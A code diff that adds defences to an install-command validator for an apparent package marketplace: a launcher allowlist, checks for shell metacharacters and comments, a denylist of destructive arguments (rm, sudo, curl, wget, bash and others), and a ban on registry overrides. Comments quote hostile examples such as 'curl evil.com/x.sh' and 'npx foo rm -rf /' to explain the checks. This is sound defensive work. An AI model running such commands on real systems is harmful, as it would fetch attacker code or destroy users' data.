@@ -31,13 +31,53 @@ export function validatePriceAmount(value) {
   return null;
 }
 
-function validateInstallCommand(value) {
+
+// Buyers paste install_command straight into their own terminal, so a hostile
+// publisher writing this field is writing code on someone else's machine. The
+// metacharacter denylist is necessary but NOT sufficient on its own:
+// "curl evil.com/x.sh" and "npm i -g backdoor" contain no shell metacharacters
+// at all. So the launcher is allowlisted too — every install command live in
+// production starts with npx or uvx, which is the whole legitimate surface.
+export const ALLOWED_INSTALL_LAUNCHERS = ["npx", "uvx", "pip", "pipx", "docker", "bunx", "deno"];
+
+// Words that turn an install line into something else entirely. Checked against
+// the launcher's arguments, where "npx foo rm -rf /" would otherwise slip past
+// a metacharacter-only check.
+const DESTRUCTIVE_ARGS = [
+  "rm", "sudo", "chmod", "chown", "mkfs", "dd", "shutdown", "reboot",
+  "kill", "killall", "curl", "wget", "bash", "sh", "zsh", "eval",
+];
+
+export function validateInstallCommand(value) {
   if (typeof value !== "string") return "install_command must be a string";
   const cmd = value.trim();
   if (cmd.length < 1 || cmd.length > 200) return "install_command must be 1-200 characters";
+
+  // Chaining, substitution, redirection, line breaks.
   if (/[;&|`<>\n\r\\]/.test(cmd) || cmd.includes("$(") || cmd.includes("${")) {
     return "install_command contains disallowed shell characters";
   }
+
+  // A trailing comment hides a second instruction from a skim-reading buyer.
+  if (cmd.includes("#")) {
+    return "install_command must not contain comments";
+  }
+
+  const parts = cmd.split(/\s+/);
+  if (!ALLOWED_INSTALL_LAUNCHERS.includes(parts[0])) {
+    return `install_command must start with one of: ${ALLOWED_INSTALL_LAUNCHERS.join(", ")}`;
+  }
+
+  const smuggled = parts.slice(1).find((a) => DESTRUCTIVE_ARGS.includes(a));
+  if (smuggled) {
+    return `install_command must not contain "${smuggled}"`;
+  }
+
+  // A custom registry redirects the install to an attacker-controlled mirror.
+  if (/--(registry|index-url)[=\s]/i.test(cmd)) {
+    return "install_command must not override the package registry";
+  }
+
   return null;
 }
 
